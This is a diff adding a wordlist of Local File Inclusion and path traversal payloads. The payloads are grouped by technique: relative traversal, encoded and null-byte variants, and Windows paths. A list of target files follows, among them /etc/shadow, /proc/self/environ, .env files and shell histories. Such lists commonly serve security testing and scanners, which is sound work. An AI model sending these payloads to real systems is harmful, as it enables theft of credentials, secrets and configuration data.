@@ -1,0 +1,51 @@
+# Local File Inclusion / Path Traversal payloads
+
+# --- Basic traversal ---
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+
+# --- Absolute paths ---
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/hostname
+/proc/self/environ
+/proc/version
+/proc/cmdline
+
+# --- Windows paths ---
+..\..\windows\win.ini
+..\..\..\windows\system32\drivers\etc\hosts
+C:\windows\win.ini
+C:\windows\system32\drivers\etc\hosts
+C:/windows/win.ini
+
+# --- URL-encoded ---
+%2e%2e%2fetc%2fpasswd
+%2e%2e/%2e%2e/etc/passwd
+..%2fetc%2fpasswd
+%252e%252e%252fetc%252fpasswd
+..%252f..%252fetc%252fpasswd
+
+# --- Null-byte (older PHP/C apps) ---
+../etc/passwd%00
+../etc/passwd%00.jpg
+../etc/passwd\0
+
+# --- Double encoding ---
+%252e%252e%252fetc%252fpasswd
+%c0%ae%c0%ae/etc/passwd
+
+# --- Interesting target files ---
+/var/log/nginx/access.log
+/var/log/apache2/access.log
+/app/config/database.yml
+/app/.env
+/home/node/.bash_history
+/root/.bash_history
+package.json
+../../../../package.json
